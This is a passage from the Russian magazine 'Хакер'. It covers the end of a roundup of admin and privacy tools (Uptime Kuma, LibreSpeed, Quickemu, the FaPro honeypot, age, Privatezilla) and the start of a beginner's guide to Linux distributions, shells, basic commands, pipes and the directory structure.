уже давно не обновляется, а из F-Droid. Затем запустить и выполнить сле‐
дующие команды:


pkg upgrade
pkg install clang make python nodejs-lts binutils git
npm install npm@6 -g


git clone https://github.com/louislam/uptime-kuma.git
cd uptime-kuma
npm run setup


node server/server.js

Только не забывай, что Android очень любит выгружать запущенные в фоне
приложения.


LibreSpeed
Все мы знаем и используем speedtest.net. Но в некоторых случаях он может
не подходить, например если ты параноик в секретной госконторе, где выход
в неконтролируемый интернет — только под твоим неусыпным надзором.
   Держи на такой случай LibreSpeed — самый простой скрипт для организа‐
ции тестирования скорости на сервере. Устанавливается одной командой
через Docker:


docker run -e MODE=standalone -p 8080:80 -it adolfintel/speedtest

И собственно, все. Оно просто работает!





                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИТРЮКИ
  МАСТЕРСКАЯ ХАКЕРА
             ПОДБОРКА ПОЛЕЗНЫХ ИНСТРУМЕНТОВ
                         ДЛЯ WINDOWS И LINUX





CONSOLE
Освобождаем удаленные файлы без перезапуска процесса
Как мы знаем, не все процессы закрывают файловые дескрипторы (указатели
на файл на диске) даже после удаления файла. Тогда du -hs такие файлы ты
не найдешь, но при этом df -h покажет, что место используется.
   Если ты не уверен, что у тебя именно так, — проверить это можно
с помощью lsof | grep deleted | less.
   Самый простой способ решить проблему — элементарно перезапустить
процесс. Но если сделать это нельзя, есть еще один вариант.
 1. Находим, какие файлы удалены:


   # find /proc/*/fd -ls 2> /dev/null | grep '(deleted)' | grep
   logstash
   1418355113      0 l-wx------   1 www-data www-data       64 Nov
   3 08:12 /proc/1009271/fd/18 -> /opt/www/.pm2/logs/pm2-logstash-
   out.log\ (deleted)
   1418355114      0 l-wx------   1 www-data www-data       64 Nov
   3 08:12 /proc/1009271/fd/19 -> /opt/www/.pm2/logs/pm2-logstash-
   error.log\ (deleted)

 2. Очищаем файл(ы):


   # truncate -s 0 /proc/1009271/fd/18


Quickemu
Проект Quickemu  призван облегчить  создание  десктопных  виртуальных
машин. Теперь больше не нужно искать дистрибутив, ставить его в виртуаль‐
ное окружение (которое часто требуется еще и настроить перед этим), нас‐
траивать гостевую ОС и только после этого пользоваться — достаточно
написать всего две команды и получить готовую систему.
   Установить его на Ubuntu можно всего в пару команд:


sudo apt-add-repository ppa:flexiondotorg/quickemu
sudo apt update
sudo apt install quickemu

Для других дистрибутивов просто клонируй репозиторий себе.
  Но на этом приключения не заканчиваются: нужно еще установить длин‐
ный список зависимостей:
 • QEMU (6.0.0 или новее) с поддержкой GTK, SDL, SPICE и VirtFS;
 • bash (4.0 или новее);
 • Coreutils;
 • EDK II;
 • grep;
 • jq;
 • LSB;
 • procps;
 • Python 3;
 • macrecovery;
 • mkisofs;
 • usbutils;
 • util-linux;
 • sed;
 • spicy;
 • swtpm;
 • wget;
 • xdg-user-dirs;
 • xrandr;
 • zsync.

Дальше можно просто в две команды запустить любой дистрибутив:


quickget ubuntu focal
quickemu --vm ubuntu-focal.conf

Так же легко можно поставить, например, macOS:


quickget macos catalina
quickemu --vm macos-catalina.conf

Кроме Catalina, конечно, поддерживаются еще и high-sierra, mojave, big-
sur и monterey. Более подробно о запуске macOS читай в репозитории.
   Установить можно даже новейшую Windows 11!


quickget windows 11
quickemu --vm windows-11.conf

Конфигурации виртуальных машин легко изменить, добавляя строки в кон‐
фиги. Следующая конфигурация создаст виртуальную машину с шестью ядра‐
ми процессора, 24 Гбайт ОЗУ и диском на 640 Гбайт:


cpu_cores="6"
ram="24G"
disk_size="640G"

Можно даже порты прокидывать:


port_forwards=("5050:5050" "8888:80")

В общем, прекрасный инструмент для простого поднятия любого количества
любых виртуалок. Рекомендую попробовать!


ВСЯЧИНА
FaPro
Если тебе вдруг срочно понадобился ханипот — обрати внимание на Fake
Protocol Server. Он умеет прикидываться различным серверным ПО и обра‐
батывать запросы по соответствующим протоколам.
  В гитхабе проекта есть несколько роликов, которые очень хорошо показы‐
вают возможности утилиты. Некоторые из них я приведу здесь, чтобы ты
не тратил время на чтение официальных доков.





                           RDP-ханипот





                          SSH

Есть всего одна небольшая проблемка: исходников нет, только бинарник
в архиве, и это вызывает некоторые вопросы. В issues уже неоднократно
спрашивали про исходники, но автор сослался на то, что код еще слишком
сырой.


132 e’s
e30e/e98e —  eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
eeeeeeeeeeeeeeeeeeee ее ееее еееееееее е еееееееееееее





        eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee


Age
Все мы знаем, как сжать файл или упаковать несколько файлов в один кон‐
тейнер. А как насчет шифрования этих контейнеров? Специально для этого
существует утилита age — современная и быстрая программа для шиф‐
рования файлов, написанная на Go.
  Она есть в репозиториях всех популярных дистрибутивов и ставится из них
по имени пакета age. Если у тебя Windows, скачать последнюю версию можно
по ссылке в официальном бинарном репозитории проекта.
   У age все завязано на ключи, а не пароли. Можно сгенерировать ключ
с помощью age-keygen или взять готовый ключ от SSH.
   Сначала давай сгенерируем ключ:


age-keygen -o age.key
Public key:
age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p

Теперь зашифруем что‑нибудь:


tar cvz ~/data | age -r
age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p >
data.tar.gz.age

И расшифруем:


age --decrypt -i age.key data.tar.gz.age > data.tar.gz

Утилита  поддерживает шифрование для  нескольких  получателей, шиф‐
рование с помощью паролей (с некоторыми оговорками) и так далее. Под‐
робнее — в readme репозитория.


Privatezilla
Privatezilla — это комплексный  инструмент для повышения  приватности
в Windows 10. Да, уже и 11-я винда вышла, но «десятка» еще долго будет акту‐
альной.


        WWW

                     Для Windows 11 попробуй  утилиту ThisIsWin11
                         того же разработчика.


Итак, что умеет этот комбайн:
 • удалять определенные предустановленные приложения;
 • удалять OneDrive;
 • откреплять меню «Пуск»;
 • отключать  телеметрию  сторонних  приложений  (вроде  Office,  Firefox,
   Dropbox);
 • удалять Windows Defender;
 • блокировать телеметрию через файрвол и файл hosts.

Автор утилиты настоятельно не рекомендует удалять файрвол — он все‑таки
не просто так встроен. Резонная рекомендация, если ты не собираешься
использовать какое‑то другое решение.





Программа умеет анализировать, что уже настроено, и не совершать лишних
действий.


             INFO

                        Подробно о разных инструментах для отключения
                          слежки мы уже писали в одной из прошлых ста‐
                          тей. Рекомендую ознакомиться!



ВЫВОДЫ
Уверен, что ты узнал о какой‑нибудь новой полезной для себя штуковине.
Если мы все еще не написали о твоей любимой утилите — дай знать в ком‐
ментах, и мы, возможно, включим ее в следующую подборку. Приятного поль‐
зования!
ТРЮКИ
 LINUX
         30       ЗА   МИНУТ





            Андрей Письменный                                  Валентин Холмогоров
                Главный редактор                                              valentin@holmogorov.ru
               apismenny@gmail.com





      РУКОВОДСТВО ПО ВЫБОРУ
      И ИСПОЛЬЗОВАНИЮ LINUX
          ДЛЯ НОВИЧКОВ




Совершенно не важно, какую операционку ты предпочита‐
ешь иметь на рабочем компьютере, — Linux сегодня бук‐
вально повсюду: на серверах, на железках вроде Raspberry
Pi, на умных устройствах, на компьютерах в госучрежде‐
ниях... Да что там, даже в Windows теперь можно запускать
Linux, чтобы легче было, к примеру, тестировать серверный
софт. Хакеру же  ориентироваться в Linux просто необ‐
ходимо.


Огромное количество хакерского софта работает только на Linux и собрано
в специализированных дистрибутивах вроде Kali. К тому же при пентесте ты
часто будешь сталкиваться с системами на Linux и должен уметь с ними обра‐
щаться. Да и просто полезно иметь опыт работы с этой мощной, абсолютно
бесплатной системой. В жизни пригодится, поверь!
  В этой статье мы попытаемся рассказать все, что сами хотели бы знать,
когда начинали интересоваться «Линуксом» много лет назад. Это и теоре‐
тические сведения, которые помогут ориентироваться, и вполне практичные
советы.


Важное предупреждение
По уровню сложности это не вполне характерная для «Хакера» статья — она
рассчитана на совсем‑совсем новых пользователей. Мысль о ней появилась,
когда мы стали компоновать подборку материалов об использовании Linux
и обнаружили, что у нас нет ничего, что подошло бы в качестве самого
начала. А если и есть, то покрыто толстыми мхами.
   Если ты против таких статей в «Хакере», можешь, конечно, отметиться
в комментариях, но, право слово, лучше иди почитай про эксплуатацию ядра
или про то, как писать минималистичный бэк‑шелл на ассемблере. Благо
таких статей у нас большинство и менять в этом плане мы ничего не собира‐
емся.
   Если же тема кажется тебе в самый раз, то пристегивайся — наш звез‐
долет отправляется, чтобы пронестись по основам Linux со сверхсветовой
скоростью.



КАКОЙ БЫВАЕТ LINUX
Первое,  с чем  сталкивается  человек, желающий  установить  Linux, —
это огромное разнообразие дистрибутивов. Все эти названия просто невоз‐
можно упомнить, но в реальности и не нужно.
   Три основных семейства дистрибутивов, о которых нужно знать в первую
очередь, — это Debian, Red Hat и Arch. Еще можно вспомнить SUSE, Mandriva
и Gentoo, но деньки их славы уже позади, да простят нас их пользователи!


             INFO

                     Chrome OS — это тоже внутри вполне настоящий
                            Linux, и в новых версиях поддерживается запуск
                        программ для Linux. Но в один ряд с другими дис‐
                           трибутивами эту ОС все же не поставишь.


Из семейства Debian в первую очередь стоит обратить внимание на Ubuntu.
Это и есть самый очевидный выбор, если ты раздумываешь, с чего начать.
Компания  Canonical,  стоящая за Ubuntu,  прикладывает огромные силы
для того, чтобы этот дистрибутив хорошо работал и был дружелюбен к поль‐
зователю. Для этого дистрибутива имеется широчайший выбор стабильно
работающих программ — ты точно не будешь испытывать в них недостатка.





                        Свежеустановленный Ubuntu





                  Стандартный набор приложений в Ununtu

К тому же  у Ubuntu огромное  сообщество, что  значительно упрощает
решение проблем: в 99% случаев ты будешь не первый, кто испытывает ту
или иную сложность. Просто копируй сообщение об ошибке, и наверняка
найдешь ветку форума, где более опытные товарищи объясняют другим пос‐
традавшим, как с этим справиться.
   Есть и другие популярные дистрибутивы, основанные на Debian, — к при‐
меру, Raspberry Pi OS, MX Linux или Kali Linux. А на Ubuntu базируются Linux
Mint, elementary OS и многие другие. Кстати, Mint и elementary тоже неплохие
варианты для новичков.
   Ставить Kali в качестве первой системы обычно не рекомендуют: этот
узкоспециализированный  хакерский  дистрибутив  плохо  приспособлен
для повседневной работы, и устанавливать его предполагается в виртуалку
или в качестве второй ОС. К тому же он под завязку забит хактулзами вместо
обычных приложений, что будет сбивать с толку. Но если ты ставишь Linux
специально, чтобы заполучить все это богатство, то кто мы такие, чтобы тебя
останавливать?
   Что до самого Debian, то его главная фишка — это лицензионная чистота.
Разработчики внимательно следят за тем, чтобы в него не попало ни строчки
кода, который распространяется не по свободной лицензии (что, может быть,
и похвально с точки зрения идеологии, но когда ты хочешь освоиться с Linux,
скорее всего, обернется разного рода сложностями).
  К семейству дистрибутивов Red Hat относятся в первую очередь Fedora,
Red Hat Enterprise Linux (RHEL) и Rocky Linux. На обычный ПК есть смысл ста‐
вить «Федору», тогда как RHEL — это коммерческое решение для серверов,
а Rocky Linux — его некоммерческий клон, созданный сообществом.





                              Fedora Linux

И наконец, Arch — это крайне интересный «гиковский» дистрибутив, который
ты можешь сам собрать по кирпичикам и настроить как тебе захочется. Одна‐
ко нырять в это без предварительных познаний в Linux не советуем. Решая
проблемы, ты, конечно, приобретешь много ценных знаний, но это далеко
не самый простой путь, и лучше отложить хождение по нему на потом.
   У Arch есть и менее суровые вариации — Manjaro и EndeavourOS. В обеих
хотя бы присутствуют заранее настроенные и подготовленные к работе окру‐
жения, но тоже аскетичные. С другой стороны, отсутствие необузданного
разнообразия может быть плюсом при первом знакомстве, так что начинать
с Manjaro — не такая плохая идея. Особенно если ты планируешь ставить
Linux на слабый компьютер.





                            Manjaro для ARM


Not Unix
В чем отличие Linux от Unix? Если очень‑очень упростить, то можно сказать,
что Unix — это предок Linux. Более сложный и развернутый ответ требует
немного углубиться в историю.
  В семидесятые годы Ричард Столлман придумал клонировать коммерчес‐
кий и по тем временам дорогостоящий Unix и создать свою операционку,
которую он назвал GNU is not Unix или просто GNU. Столлман и компания
переписали все компоненты Unix и опубликовали их под придуманной ими
«вирусной» лицензией GPL.
   Изначально словом Linux называли только созданное Линусом Торваль‐
дсом ядро. Но название Linux и маскот‑пингвин быстро прижились, и ими
теперь обозначают всю ОС — несмотря на возражения Столлмана и просьбы
писать только GNU/Linux.
   Linux в эпоху интернета стал быстро набирать популярность, и коммерчес‐
ким вариантам Unix со временем просто не осталось места. Тем не менее
до сих пор живы его потомки — операционные системы FreeBSD и OpenBSD,
которые теперь бесплатны и многое заимствуют из современного «Линукса».
Кстати, на FreeBSD основаны macOS и iOS.


Получается, что выбор дистрибутива — это в первую очередь выбор подхода
и даже идеологии. Однако более приземленным ориентиром обычно служит
набор основных компонентов, из которых строятся дистры. Давай обсудим
главные из них.


ЯДРО
Ядро, хоть и критически важно для работы системы, особо не интересно
с точки зрения пользователя — взаимодействовать с ним напрямую тебе
вряд ли придется, пока ты не станешь настоящим гуру.
   Возможно, ты часто слышал про «сборку ядра» и можешь даже самос‐
тоятельно попробовать сделать это. Поскольку ядро Linux монолитное, в него
должна  входить  поддержка  множества вещей, которые  касаются  всех
аспектов работы компьютера. Соответственно, перед сборкой можно и нужно
задать кучу всяких настроек, но ничего особенно увлекательного в этом,
поверь, нет, хотя процесс крайне познавательный.
  В системе может одновременно присутствовать сколько угодно ядер,
а какое именно будет использоваться, ты можешь выбрать в загрузчике.
Апгрейд ядра до более новой версии — совершенно рутинное дело в Linux
и обычно происходит автоматически.


ПАКЕТНЫЙ МЕНЕДЖЕР
Любой Linux состоит из тысяч мелких компонентов — программ, библиотек
и ресурсов (например, файлов конфигурации, наборов иконок и так далее).
Распространяются они в виде пакетов (package).
   Пакетный менеджер — это специальная программа, которая выполняет
установку, настройку, удаление, а также обновление как отдельных приложе‐
ний, так и всей системы в целом или ее компонентов.
   Очень часто один пакет требует для работы наличия других, и следить
за этими зависимостями вручную на современной системе невозможно.
Поэтому основа каждого дистрибутива — это пакетный менеджер, который
рулит  установкой и обновлением  софта. В  дистрибутивах,  основанных
на Debian, он называется APT, в Red Hat — DNF, а в Arch — pacman.
   Пакеты менеджер берет из репозитория — большого склада, куда соз‐
датели дистрибутива загружают их. Репозиториев зачастую можно подклю‐
чить сразу несколько. Например, в Ubuntu есть четыре основных: Main (под‐
держиваемый разработчиками), Universe (поддерживаемый сообществом),
Restricted (с проприетарным ПО) и Multiverse (с ПО, на которое действуют
несвободные лицензии).
   Поскольку вскоре после установки Linux ты обнаружишь необходимость
в драйверах для железа, дополнительных шрифтах, кодеках и тому подобных
вещах, скорее всего, понадобится разрешить системе доступ к запятнанным
коммерцией репозиториям. В Ubuntu это делается в меню «Программы
и обновления».


ГРАФИЧЕСКАЯ СИСТЕМА
Далеко не каждый Linux снабжен графической системой или вообще нуждает‐
ся в ней — очень многие действия здесь можно делать и из командной стро‐
ки. Однако современный рабочий стол — это все же иконки и окошки.
   Чтобы работать с графикой, в Linux должны присутствовать сервер дис‐
плея X.Org (традиционный вариант) либо новомодный композитор Wayland,
на который сейчас переходят наиболее передовые дистрибутивы. Плюс тре‐
буется оконный менеджер — программа, которая отвечает за то, как выглядят
и работают элементы интерфейса.
   Впрочем,  это  всё  довольно  низкоуровневые  подробности,  нырять
в которые с ходу не обязательно. Куда скорее тебе придется задуматься
о выборе рабочей среды (Desktop Environment, DE). Это совокупность окон‐
ного менеджера и разного рода программ, мелких (например, рисующих раз‐
ные панели, рабочий стол, виджеты) и крупных — вроде файлового менед‐
жера. Сюда же обычно входит и набор базового софта: календарь, почтовик
и прочее в таком духе.
   Самые известные оконные среды — это GNOME и KDE. Но в реальности
их список гораздо длиннее. Любители минимализма могут присмотреться
к Xfce или LXDE, а Ratpoison, dwm,  i3 и xmonad  предоставляют среду
с неперекрывающимися окнами, что некоторые находят удобным.
  А еще от GNOME отвалились проекты MATE и Cinnamon — их разработ‐
чикам не понравился интерфейс GNOME 3, и они продолжили развивать вто‐
рую  ветку. А в elementary OS используется своя среда под названием
Pantheon, которую не встретишь больше нигде. В общем, разнообразие
огромно!
   Создатели дистрибутивов, в которые входит графическая среда, обычно
выбирают одну или несколько сред, которые будут поддерживать официаль‐
но. Но при этом тебе ничто не мешает поменять DE или установить одновре‐
менно больше одной, чтобы переключаться между ними или использовать
программы одной среды из другой. Пробуй, экспериментируй, и сам пой‐
мешь, что тебе ближе.


КОМАНДНЫЙ ИНТЕРПРЕТАТОР
Пользователи Windows привыкли к тому, что в этой операционной системе
имеется  стандартный  интерпретатор команд cmd.exe, который  принято
называть командной строкой. В последних версиях винды его органично
дополнил PowerShell, однако этими двумя средами ассортимент командных
интерпретаторов в Windows исчерпывается.
  В  Linux командных  интерпретаторов  существует  множество,  и, если
для Windows они лишь вспомогательное средство администрирования, здесь
это один из основных и очень мощных инструментов работы с системой.
   Собственно, сама история Linux началась именно с командной строки,
точнее терминала или даже телетайпа. Графический интерфейс к нему при‐
делали уже значительно позже. Именно поэтому командную строку в Linux
часто называют «эмулятор терминала», а процессы с ними носят префикс tty
(teletype).
   Как ты знаешь, с использованием команд в Windows можно писать скрип‐
ты, автоматизирующие какие‑либо действия: пакетные файлы (batch  files)
были в ходу еще со времен MS-DOS, а PowerShell заметно расширил и углу‐
бил эту технологию. В Linux можно делать то же самое: собранный в файл
набор команд  интерпретатора может работать как сложная программа,
а сами команды являются по большому счету языком программирования.
   Наборы команд, сохраненные одним файлом, принято называть сценари‐
ями или скриптами. Все скрипты в Linux начинаются с символов #! (это
сочетание называется «шебанг») и пути к интерпретатору — команде, которая
будет исполнять скрипт.
   Стандартным командным  интерпретатором в  Linux  является bash —
обновленная и модернизированная версия командной оболочки Bourne shell,
которая была изобретена Стивеном Борном в 1978 году и использовалась
еще в классическом Unix.
   Прожженные линуксоиды предпочитают ставить вместо bash более прод‐
винутый интерпретатор — Z shell (ZSH), обратно совместимый с bash, но име‐
ющий по сравнению с ним множество улучшений. Для этой оболочки сооб‐
ществом был разработан специальный открытый и бесплатный фреймворк
Oh My ZSH, который содержит множество плагинов для автоматизации
работы с командами и скриптами. Как минимум Oh My ZSH позволяет исполь‐
зовать красивые темы оформления окна командной  строки,  благодаря
которым окружающие точно сочтут тебя гениальным хакером.


             INFO

                        Подробнее о ZSH и Oh My ZSH читай в статье
                            «Прокачай терминал! Полезные трюки, которые
                         сделают тебя гуру консоли».


Предупредим о проблеме, с которой моментально сталкивается каждый
новый пользователь Linux. Если ты зайдешь в какой‑то каталог и попытаешься
написать название исполняемого файла, чтобы запустить его, то ничего
не получится. Почему?
   Причина в том, что интерпретатор ищет файлы только в каталогах, которые
указаны в переменной окружения $PATH. То есть тебе нужно либо задать пол‐
ный путь к исполняемому файлу, либо явно указать на текущий каталог. Как ты
знаешь, родительский каталог отмечается двумя точками (../), а чтобы ука‐
зать на текущий, нужно писать ./. То есть вместо program пиши ./program,
и все получится!
  И еще один очень важный момент. В Windows тип файла определяется его
расширением — в зависимости от него командный интерпретатор и оболочка
решают, как они будут обрабатывать файл. В Linux все устроено немного
по‑другому: у bash полностью отсутствует какое‑либо уважение к расширени‐
ям файлов. Исполняемый файл отличается от обычного не расширением,
а наличием права на его исполнение: если оно есть, система считает такой
файл программой (или скриптом) и пытается выполнить. О правах на файлы
мы подробнее поговорим чуть дальше в соответствующем разделе.


ДОМАШНИЙ КАТАЛОГ И СКРЫТЫЕ ФАЙЛЫ
Поскольку Linux изначально задумывался как многопользовательская опе‐
рационная система, все пути к «домашним» папкам, переменные окружения,
программы, которые запускаются при открытии терминала, и другие настрой‐
ки задаются в профиле пользователя. У разных юзеров они, соответственно,
разные. Благодаря этому ты можешь, например, настроить системное окру‐
жение так, как комфортно именно тебе.
   Чтобы указывать на домашний каталог, очень удобно использовать символ
~. Так, вместо /home/vasya/ можно писать просто ~/, если ты залогинен
как vasya.
  В Linux часто встречается то, что в Windows попросту невозможно: файлы,
имя которых начинается с точки (пользователи винды с непривычки думают,
будто это файлы без имени, имеющие одно только расширение). На самом
деле в Linux так обозначают скрытые файлы. Например, имя .htacess
говорит нам о том, что этот файл скрытый, — благодаря наличию точки
перед именем его легко отличить от других файловых объектов.
  В домашнем каталоге пользователя хранится несколько скрытых файлов,
которые могут быть очень полезны при работе в Linux. Чтобы просмотреть
скрытые файлы в текущем каталоге, используй консольную команду ls -a
или поковыряйся в меню файлового менеджера: например, в Nautilus пункт
«Показать скрытые файлы» прячется в меню «Вид». Обрати внимание на сле‐
дующие скрытые файлы:
 • .bash_profile — содержит информацию о пользовательском окру‐
   жении  и  запускаемых  при  авторизации  пользователя  программах.
  В  некоторых  дистрибутивах,  основанных на  Debian,  данного  файла
   по умолчанию не существует, но ты можешь создать его самостоятельно;
 • .bash_login —   этот  файл   исполняется,  если   отсутствует  .
  bash_profile, и выполняет схожую функцию. Этого файла не существует
   по умолчанию ни в дистрибутиве Debian, ни в дистрибутиве Red Hat;
 • .profile —  выполняется  при  отсутствии  .bash_profile  и  .
  bash_login;
 • .bash_logout —  сценарий,  который  выполняется  автоматически
   при завершении работы командной оболочки;
 • .bash_history — хранит информацию обо всех командах, набранных
   в bash;
 • .ssh — каталог, в котором хранятся ключи шифрования для подключения
   по SSH;
 • .bashrc — сценарий, который обычно настраивается другими сценари‐
  ями для своих собственных нужд — например, запуска демонов или обра‐
   ботки каких‑либо команд.


Необходимый минимум команд
Итак, запоминай самые важные команды, если еще не знаешь их:
 • man — чуть ли не самая важная команда — она отображает справку
  о команде, название которой ты напишешь следом;
 • ls (от слова list, список) — перечислить все файлы в текущей директории,
   аналог виндовой команды dir. Самые важные ключи: -a (all) — показы‐
   вать скрытые файлы, -l (long) — показывать подробности, -h (human) —
   показывать размеры в «человеческих» единицах, а не в байтах. Можно
   писать все ключи сразу: ls -lha;
 • cd (change directory) — сменить директорию. Дальше можно указать папку,
   в которую ты хочешь перейти;
 • pwd (print working directory) — узнать текущий путь;
 • cp (copy) — скопировать файл. Дальше нужно указать, что и куда копиро‐
   вать;
 • mv (move) — переместить файл. Тоже указываем какой, затем — куда;
 • rm (remove) — стереть файл. Если стираешь каталог, указывай опцию -r
    (recursive), чтобы стереть все подкаталоги внутри, подкаталоги внутри них
   и так далее;
 • chmod и chown — поменять права на файл или владельца файла;
 • cat (concatenate) — придумана, чтобы объединять файлы, но  часто
   используется, чтобы всего лишь вывести содержимое текстового файла.
   Просто напиши его название после cat;
 • less — если файл длинный, то его удобно прокручивать. Для этого и при‐
   думана команда less;
 • head и tail — с опцией -n  число показывают сколько‑то строк
   от начала (head) или конца (tail) указанного файла;
 • grep — поиск в строке по подстроке или регулярному выражению;
 • find — поиск файлов;
 • mkdir (make directory) — создание директории;
 • touch — создание пустого файла. Просто укажи его название;
 • sudo — выполнить следующую далее команду от имени суперпользовате‐
   ля;
 • df  (disk  free) —  посмотреть,  сколько на  дисках  свободного  места.
   Рекомендую писать df -h по аналогии с ls -h;
 • du (disk usage) — узнать, сколько занимает каталог. Тоже есть опция -h;
 • ps (processes) — посмотреть список запущенных тобой процессов и их
   идентификаторы;
 • kill и идентификатор — завершить какой‑то процесс.

Несколько важных сетевых команд:
 • ping — попинговать узел;
 • nslookup — узнать информацию об узле;
 • traceroute — проследить путь пакетов до узла;
 • netstat — информация об открытых портах и соединениях;
 • whois — информация о регистрации домена.

Помимо  этого, в  Linux обычно есть  несколько  утилит, которые  сильно
облегчат тебе жизнь. Если их нет, то стоит их установить:
 • git — популярнейшая система контроля версий, как и ядро Linux, соз‐
   данная Линусом Торвальдсом;
 • nano — простейший текстовый редактор, работающий в терминале;
 • unzip и unrar — думаю, ты догадываешься, зачем они нужны;
 • curl нужен для веб‑запросов;
 • wget — для скачивания больших файлов;
 • htop показывает уровень загрузки системы и список процессов.

Важно: выйти из программ, которые не закрываются сами, обычно можно,
нажав Q. Прервать работу — Ctrl-C. А чтобы выйти из vim, если ты его открыл
случайно, набери последовательность :q! и нажми Enter.





                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИТРЮКИ
    LINUX   30         ЗА   МИНУТ
                      РУКОВОДСТВО ПО ВЫБОРУ
          И ИСПОЛЬЗОВАНИЮ LINUX ДЛЯ НОВИЧКОВ





ВВОД-ВЫВОД И ПАЙПЫ
Большинство программ, работающих из командной строки, принимают дан‐
ные на вход и что‑то выдают на выходе. При этом вывод одной программы
можно направить на ввод другой и таким образом достичь какой‑то более
сложной цели или автоматизировать какой‑то процесс. Давай разберемся
подробнее.
   Стандартный поток ввода, к которому по умолчанию «привязана» кла‐
виатура, называется standard input (stdin). Стандартный поток вывода носит
название standard output (stdout). Существует и отдельный поток вывода,
предназначенный исключительно для сообщений об ошибках. Он называется
standard error, или stderr. По умолчанию с этими двумя потоками вывода свя‐
зан монитор.
   Потоки приложений и команд можно перенаправлять в файлы или в другие
команды.  Поскольку  стандартные  потоки  ввода‑вывода  предназначены
в основном для обмена текстовой информацией, такое перенаправление
позволяет наладить «общение» программ между собой.
   Самый простой пример подобного общения — это когда мы передаем
стандартный вывод (stdout) одной программы на стандартный ввод (stdin)
другой. Такой вариант перенаправления обозначается в Linux символом |
и называется термином «конвейер» или «пайп» (pipe). Например, если мы
используем запись вида команда 1 | команда 2, это будет означать, что
весь стандартный вывод команды 1, который по умолчанию был бы направлен
на дисплей (stdout), будет передан на стандартный ввод (stdin) команды 2.
Это и есть реализация простейшего пайпа или конвейера.
   Возможно, ты уже натыкался на использование пайпов в сочетании
с командой grep,  предназначенной для  фильтрации  текстовых  данных.
Работает она так:


$ команда | grep [опции] шаблон

где команда — это команда, стандартный вывод которой перенаправляется
команде grep;
опции — это различные параметры поиска;
шаблон — строка или значение, которые мы ищем.
   Например, команда ls | grep string означает, что мы, получив список
содержимого текущей директории c помощью консольной команды ls, ищем
в нем файл или папку, в имени которых содержится строка string.
  Еще вывод команды бывает удобно перенаправить в файл. Напиши
ls -lha > list.txt, и получишь файл list.txt с подробным перечислени‐
ем всего, что содержится в текущем каталоге.


Полезные шпаргалки
Вся мощь команд Linux — в дополнительных параметрах, которые ты можешь
указать. Чтобы узнать о них, нужно читать справку (man), но есть способы
схитрить и облегчить себе жизнь.
 • tldr pages — сокращенная версия man, в которой дотошные описания
   покромсали до абсолютного минимума (подробнее);
 • cheat.sh — онлайновая база данных с примерами популярных вариантов
   команд (подробнее);
 • Marker — похожая штука, но офлайновая и с подсказками «на лету» (под‐
   робнее);
 • explainshell.com — сервис, который автоматически разбирает сложную
   команду и объясняет значение ее составных частей.

Запомнить все параметры всех команд невозможно, поэтому даже заядлые
линуксоиды прибегают к таким хитростям (и неустанно изобретают всё
новые)!



ФАЙЛОВЫЕ СИСТЕМЫ
В Linux есть поддержка разных файловых систем. Любой современный Linux
по умолчанию устанавливается на ext4 и требует создания отдельного раз‐
дела типа Swap (аналог файла подкачки в Windows). Помимо этого, обычно
поддерживаются диски ext2 и ext3, XFS и FAT разных версий. В Ubuntu
и некоторых других дистрибутивах из коробки доступна работа с разделами
NTFS на чтение и запись. Что до маковских HFS+ и APFS, то для них обычно
требуется отдельный драйвер.
   Чтобы работать с какой‑то ФС (расположенной на жестком диске или на
внешнем  носителе), ее  нужно  примонтировать, а перед  завершением
работы — демонтировать. За это отвечают команды mount и umount. В файле
/etc/fstab указываются системы, которые Linux будет монтировать авто‐
матически при загрузке.
   Отдельного  упоминания  заслуживает  система  FUSE —  Filesystem
in Userspace (в противовес поддержке на уровне ядра). Через эту штуку мож‐
но  подключать  неподдерживаемые  по  умолчанию  файловые  системы
или даже сделать подобие файловой системы из API облачного сервиса.
Подробнее об этом читай в статье «Все есть файл! Монтируем Git-репози‐
тории, FTP- и SSH-ресурсы, ZIP-архивы, торренты, магнитные ссылки и мно‐
гое другое».


СИСТЕМА КАТАЛОГОВ
В любой ОС есть каталоги с системными файлами, которые лучше не трогать
без лишней надобности. Но если в Windows папки с системой просто лежат
в сторонке, то в Linux все наоборот: ты работаешь внутри уже заданной струк‐
туры каталогов, причем во многие из них можно и нужно заглядывать.
   Одна из причин такой организации в том, что файлами в Linux могут быть
не только данные на диске, но и порты, процессы и другие сущности. Как ты
можешь догадаться, читать и писать в них теми же средствами, что и при
работе с обычными файлами, иногда очень удобно.
   Слеши «не в ту сторону» вряд ли тебя смутят, но гораздо более непривыч‐
но после Windows то, что пути полностью виртуальны и никак не связаны
с дисками. Данные по разным путям могут быть на разных разделах, на раз‐
ных носителях или даже на разных компьютерах.
   Итак, давай посмотрим на структуру каталогов, которую ты увидишь почти
в любом Linux:
 • / — корневая папка, или, как ее еще называют, root directory — папка,
   в которой хранится все остальное содержимое файловой системы;
 • /bin (от слова binary) — здесь лежат двоичные исполняемые файлы
   со всеми основными командами;
 • /boot — здесь расположен загрузчик и ядро ОС (файлы vmlinuz —
   это как раз оно и есть);
 • /dev — файлы в этой папке — это порты и устройства. Работая с этими
   файлами, приложения и драйверы могут обмениваться информацией нап‐
  рямую с оборудованием. Впрочем, некоторые файлы — это не настоящие
   устройства, а виртуальные. Например, знаменитый /dev/null принимает
  любую информацию и ничего с ней не делает, а /dev/random генерирует
   случайные числа;
 • /etc — в этой папке содержатся общесистемные файлы конфигурации
    (тогда как пользовательские файлы конфигурации находятся в домашнем
   каталоге каждого пользователя). Если ты администратор системы, то сюда
   придется часто заглядывать при настройке разных программ;
 • /home — в этой папке содержатся домашние каталоги пользователей
   Linux. Например, если твое имя пользователя — xakep, твоя домашняя
   папка будет называться /home/xakep/;
 • /lib — папка для хранения библиотек, необходимых исполняемым фай‐
  лам в папках bin и sbin;
 • /lost+found — в эту папку сохраняются восстановленные в случае сис‐
   темного сбоя файлы;
 • /media — в некоторых системах дополнительный каталог, где отобража‐
   ются все смонтированные в системе съемные носители информации.
  В старых ОС может называться /cdrom;
 • /mnt — папка, содержащая временные точки монтирования: сюда мон‐
   тируются файловые системы для временного использования;
